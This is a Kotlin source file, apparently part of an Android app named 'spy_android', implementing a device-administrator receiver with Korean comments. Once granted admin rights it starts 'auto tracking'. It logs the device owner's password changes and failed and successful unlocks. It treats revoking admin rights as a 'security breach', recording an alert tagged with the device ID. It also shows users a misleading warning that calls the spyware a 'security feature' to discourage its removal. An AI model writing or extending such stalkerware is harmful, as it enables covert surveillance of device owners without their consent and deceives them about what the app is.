package com.example.spy_android.receivers

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import java.io.File

class SpyDeviceAdminReceiver : DeviceAdminReceiver() {

    companion object {
        private const val TAG = "SpyDeviceAdminReceiver"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d(TAG, "디바이스 관리자 권한 활성화됨")

        // 디바이스 관리자 활성화 로그
        logDeviceAdminEvent(context, "DEVICE_ADMIN_ENABLED", "Device administrator privileges granted")

        // 자동 추적 시작
        startAutoTracking(context)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.d(TAG, "디바이스 관리자 권한 비활성화됨")

        // 비활성화 로그 및 경고
        logDeviceAdminEvent(context, "DEVICE_ADMIN_DISABLED", "Device administrator privileges revoked - SECURITY BREACH")

        // 긴급 알림 전송
        sendEmergencyAlert(context, "Device admin disabled")
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        super.onPasswordChanged(context, intent)
        logDeviceAdminEvent(context, "PASSWORD_CHANGED", "Device password/PIN changed")
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        super.onPasswordFailed(context, intent)
        logDeviceAdminEvent(context, "PASSWORD_FAILED", "Failed password attempt detected")
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        super.onPasswordSucceeded(context, intent)
        logDeviceAdminEvent(context, "PASSWORD_SUCCESS", "Successful password attempt")
    }

    // 팩토리 리셋 시도 감지
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        logDeviceAdminEvent(context, "DISABLE_REQUESTED", "Attempt to disable device admin detected")
        sendEmergencyAlert(context, "Admin disable attempt")

        // 사용자에게 보여줄 경고 메시지
        return "Warning: Disabling this security feature may compromise device protection. Are you sure?"
    }

    private fun logDeviceAdminEvent(context: Context, event: String, details: String) {
        try {
            val logData = mapOf(
                "event_type" to "device_admin_event",
                "event" to event,
                "details" to details,
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                    .format(java.util.Date())
            )

            val logDir = File(context.filesDir, "logs")
            if (!logDir.exists()) {
                logDir.mkdirs()
            }

            val logFile = File(logDir, "device_admin_events.log")
            val jsonData = android.text.TextUtils.join(",", logData.map { "\"${it.key}\":\"${it.value}\"" })
            logFile.appendText("{$jsonData}\n")

        } catch (e: Exception) {
            Log.e(TAG, "디바이스 관리자 이벤트 로그 저장 실패: ${e.message}")
        }
    }

    private fun startAutoTracking(context: Context) {
        try {
            // MainActivity 시작하여 자동 추적 활성화
            val intent = Intent(context, com.example.spy_android.MainActivity::class.java)
            intent.action = "AUTO_START_TRACKING"
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)

        } catch (e: Exception) {
            Log.e(TAG, "자동 추적 시작 실패: ${e.message}")
        }
    }

    private fun sendEmergencyAlert(context: Context, reason: String) {
        try {
            // 긴급 상황 파일 생성
            val emergencyData = mapOf(
                "alert_type" to "DEVICE_ADMIN_EMERGENCY",
                "reason" to reason,
                "timestamp" to System.currentTimeMillis(),
                "device_id" to android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                )
            )

            val alertDir = File(context.filesDir, "emergency_alerts")
            if (!alertDir.exists()) {
                alertDir.mkdirs()
            }

            val alertFile = File(alertDir, "emergency_${System.currentTimeMillis()}.json")
            val jsonData = android.text.TextUtils.join(",", emergencyData.map { "\"${it.key}\":\"${it.value}\"" })
            alertFile.writeText("{$jsonData}")

        } catch (e: Exception) {
            Log.e(TAG, "긴급 알림 생성 실패: ${e.message}")
        }
    }
}